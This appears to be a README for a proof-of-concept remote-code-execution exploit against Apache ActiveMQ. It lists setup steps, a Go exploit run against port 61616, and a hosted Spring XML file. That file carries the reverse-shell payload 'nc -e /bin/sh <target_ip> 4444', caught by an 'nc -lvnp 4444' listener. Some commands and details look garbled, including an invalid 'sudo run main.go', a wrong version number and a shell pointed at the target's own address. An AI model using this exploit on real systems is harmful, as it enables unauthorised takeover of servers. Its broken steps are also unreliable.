# POC

**Ready to environment:**

1. Download Active MQ 18.0.0 Release fromhere:
https://activemq.apache.org/activemq-5018000-release

2.Install the Active MQ based on instructions, you can use it:
https://www.techbeginner.in/2019/12/how-to-install-apache-activemq-on-ubuntu-16-04.html

3. Tested on Kali (Debian) current distribution.

**Build POC:**

 1. $ python3 -m http.server 8001 (where the .xml poc file)
 2. $ sudo go build main.go (build & run go file)
 3. $ sudo run main.go
 4. $ systemctl status activemq  (Check the Activemq service is up)
 5. Check the values tags on xml file as:

                <value>sh</value>
                <value>-c</value>
                <value>nc -e /bin/sh <target_ip> 4444</value>
6. Check the default values. You don't need to review it:
	- flag.StringVar(&ip, "i", "", "ActiveMQ Server IP or Host")
	- flag.StringVar(&port, "p", "61616", "ActiveMQ Server Port")
	- flag.StringVar(&url, "u", "", "Spring XML Url")\n
	- flag.Parse()

**Run POC:**

7. $ ./main -i <target_ip> -u http://127.0.0.1:8001/poc-linux.xml
8.  $ nc -lvnp 4444 (listening for reverse shell)
